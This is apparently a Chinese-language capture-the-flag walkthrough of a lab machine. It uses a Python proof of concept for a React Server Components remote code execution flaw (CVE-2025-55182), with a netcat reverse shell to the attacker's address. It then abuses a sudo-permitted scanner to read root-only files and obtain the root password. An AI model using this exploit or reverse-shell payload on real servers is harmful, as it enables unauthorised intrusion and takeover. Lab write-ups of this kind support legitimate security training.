## 1.探测
```
┌──(root㉿kali)-[~]
└─# nmap -p- 192.168.3.164                            
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-07 18:37 CST
Nmap scan report for 192.168.3.164
Host is up (0.00049s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp
```

访问80和3000端口，无发现
![](images/Pasted%20image%2020260107183905.png)

![](images/Pasted%20image%2020260107183833.png)
## 2.漏洞
POC链接：`https://github.com/msanft/CVE-2025-55182/`

需要改下**BASE_URL**和**EXECUTABLE**，分别是靶机和本地

```python
# /// script
# dependencies = ["requests"]
# ///
import requests
import sys
import json

BASE_URL = sys.argv[1] if len(sys.argv) > 1 else "http://192.168.3.164:3000"
EXECUTABLE = sys.argv[2] if len(sys.argv) > 2 else "busybox nc 192.168.3.4 1111 -e /bin/bash"

crafted_chunk = {
    "then": "$1:__proto__:then",
    "status": "resolved_model",
    "reason": -1,
    "value": '{"then": "$B0"}',
    "_response": {
        "_prefix": f"var res = process.mainModule.require('child_process').execSync('{EXECUTABLE}',{{'timeout':5000}}).toString().trim(); throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});",
        # If you don't need the command output, you can use this line instead:
        # "_prefix": f"process.mainModule.require('child_process').execSync('{EXECUTABLE}');",
        "_formData": {
            "get": "$1:constructor:constructor",
        },
    },
}

files = {
    "0": (None, json.dumps(crafted_chunk)),
    "1": (None, '"$@0"'),
}

headers = {"Next-Action": "x"}
res = requests.post(BASE_URL, files=files, headers=headers, timeout=10)
print(res.status_code)
print(res.text)

```

本地先`nc -lvnp 1111` 然后执行一下`python`文件
![](images/Pasted%20image%2020260107222416.png)
## 3.升级shell
```shell
┌──(zsc@kali)-[~] 
└─$ nc -lnvp 5566 
listening on [any] 5566 ...

connect to [192.168.1.5] from (UNKNOWN) [192.168.1.2] 47122
script -qc /bin/bash /dev/null 
bot@React:/opt/target$ ^Z  #（此处按ctrl + Z）
zsh: suspended nc -lnvp 5566

┌──(zsc?kali)-[~] 
└─$ stty raw -echo;fg 
[1] + continued nc -lnvp 5566 
							reset 
reset: unknown terminal type unknown 
Terminal type? xterm
```

## 4.提权
```bash
bot@React:/opt/target$ sudo -l
Matching Defaults entries for bot on React:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User bot may run the following commands on React:
    (ALL) NOPASSWD: /opt/react2shell/scanner.py
    (ALL) NOPASSWD: /usr/bin/rm -rf /
```

```bash
bot@React:/opt/target$ /opt/react2shell/scanner.py --help
usage: scanner.py [-h] (-u URL | -l LIST) [-t THREADS] [--timeout TIMEOUT]
                  [-o OUTPUT] [--all-results] [-k] [-H HEADER] [-v] [-q]
                  [--no-color] [--safe-check] [--windows] [--waf-bypass]
                  [--waf-bypass-size KB]

React2Shell Scanner

optional arguments:
  -h, --help            show this help message and exit
  -u URL, --url URL     Single URL/host to check
  -l LIST, --list LIST  File containing list of hosts (one per line)
  -t THREADS, --threads THREADS
                        Number of concurrent threads (default: 10)
  --timeout TIMEOUT     Request timeout in seconds (default: 10)
  -o OUTPUT, --output OUTPUT
                        Output file for results (JSON format)
  --all-results         Save all results to output file, not just vulnerable
                        hosts
  -k, --insecure        Disable SSL certificate verification
  -H HEADER, --header HEADER
                        Custom header in 'Key: Value' format (can be used
                        multiple times)
  -v, --verbose         Verbose output (show response snippets for vulnerable
                        hosts)
  -q, --quiet           Quiet mode (only show vulnerable hosts)
  --no-color            Disable colored output
  --safe-check          Use safe side-channel detection instead of RCE PoC
  --windows             Use Windows PowerShell payload instead of Unix shell
  --waf-bypass          Add junk data to bypass WAF content inspection
                        (default: 128KB)
  --waf-bypass-size KB  Size of junk data in KB for WAF bypass (default: 128)

Examples:
  scanner.py -u https://example.com
  scanner.py -l hosts.txt -t 20 -o results.json
  scanner.py -l hosts.txt --threads 50 --timeout 15
  scanner.py -u https://example.com -H "Authorization: Bearer token" -H "User-Agent: CustomAgent"
```


查看帮助，`-l`可以指定输入文件，`-o`指定输出文件，`--all-results`保存所有结果，`-t`指定线程，这里建议使用单线程`-t 1`

```bash
bot@React:/opt/target$ < sudo /opt/react2shell/scanner.py -l /root/root.txt -o /tmp/1.txt --all-results -t 1

brought to you by assetnote

[*] Loaded 1 host(s) to scan
[*] Using 1 thread(s)
[*] Timeout: 10s
[*] Using RCE PoC check
[!] SSL verification disabled

[ERROR] flag{root-bc29a7159b63b18dc294002be32e1c22} - Connection Error: HTTPSConnectionPool(host='flag%7broot-bc29a7159b63b18dc294002be32e1c22%7d', port=443): Max retries exceeded with url: / (Caused by NameResolutionError("HTTPSConnection(host='flag%7broot-bc29a7159b63b18dc294002be32e1c22%7d', port=443): Failed to resolve 'flag%7broot-bc29a7159b63b18dc294002be32e1c22%7d' ([Errno -2] Name or service not known)"))

============================================================
SCAN SUMMARY
============================================================
  Total hosts scanned: 1
  Vulnerable: 0
  Not vulnerable: 1
  Errors: 0
============================================================

[+] Results saved to: /tmp/1.txt

```

这一步和上面一步读取`flag`相似。使用`linpeas`脚本，发现一个可疑的二进制文件`/usr/bin/check_key`
```bash
strings /usr/bin/check_key
```
直接执行无回显，看下里面的可打印字符
![](images/Pasted%20image%2020260107221501.png)

可以看到`cp /root/Reactrootpass.txt /opt`,尝试读取`/root/Reactrootpass.txt`，使用上面的读取命令
```bash
bot@React:/tmp$ sudo /opt/react2shell/scanner.py -l /root/Reactrootpass.txt -t 1 -o /tmp/1.json --all-results

brought to you by assetnote

[*] Loaded 1 host(s) to scan
[*] Using 1 thread(s)
[*] Timeout: 10s
[*] Using RCE PoC check
[!] SSL verification disabled

[ERROR] To75CuOTHLA7BMmH5Puv - Connection Error: HTTPSConnectionPool(host='to75cuothla7bmmh5puv', port=443): Max retries exceeded with url: / (Caused by NameResolutionError("HTTPSConnection(host='to75cuothla7bmmh5puv', port=443): Failed to resolve 'to75cuothla7bmmh5puv' ([Errno -2] Name or service not known)"))

============================================================
SCAN SUMMARY
============================================================
  Total hosts scanned: 1
  Vulnerable: 0
  Not vulnerable: 1
  Errors: 0
============================================================

[+] Results saved to: /tmp/1.json
```
获得一个字符串 `to75cuothla7bmmh5puv`,登录`root`，发现认证失败，密码还是不对，cat 1.json看下

```bash
bot@React:/tmp$ cat /tmp/1.json
{
  "scan_time": "2026-01-07T14:13:38.515230+00:00Z",
  "total_results": 1,
  "results": [
    {
      "host": "To75CuOTHLA7BMmH5Puv",
      "vulnerable": null,
      "status_code": null,
      "error": "Connection Error: HTTPSConnectionPool(host='to75cuothla7bmmh5puv', port=443): Max retries exceeded with url: / (Caused by NameResolutionError(\"HTTPSConnection(host='to75cuothla7bmmh5puv', port=443): Failed to resolve 'to75cuothla7bmmh5puv' ([Errno -2] Name or service not known)\"))",
      "request": "POST /aaa HTTP/1.1\r\nHost: To75CuOTHLA7BMmH5Puv\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0.0\r\nNext-Action: x\r\nX-Nextjs-Request-Id: b5dce965\r\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\nX-Nextjs-Html-Request-Id: SSTMXm7OJ_g0Ncx6jpQt9\r\nContent-Length: 703\r\n\r\n------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\nContent-Disposition: form-data; name=\"0\"\r\n\r\n{\"then\":\"$1:__proto__:then\",\"status\":\"resolved_model\",\"reason\":-1,\"value\":\"{\\\"then\\\":\\\"$B1337\\\"}\",\"_response\":{\"_prefix\":\"var res=process.mainModule.require('child_process').execSync('echo $((41*271))').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});\",\"_chunks\":\"$Q2\",\"_formData\":{\"get\":\"$1:constructor:constructor\"}}}\r\n------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\nContent-Disposition: form-data; name=\"1\"\r\n\r\n\"$@0\"\r\n------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\nContent-Disposition: form-data; name=\"2\"\r\n\r\n[]\r\n------WebKitFormBoundaryx8jO2oVc6SWP3Sad--",
      "response": null,
      "final_url": "https://To75CuOTHLA7BMmH5Puv/",
      "timestamp": "2026-01-07T14:13:38.409666+00:00Z"
    }
  ]
}
```

在试一次==**To75CuOTHLA7BMmH5Puv**==，成功
```bash
bot@React:/tmp$ su
Password: 
root@React:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```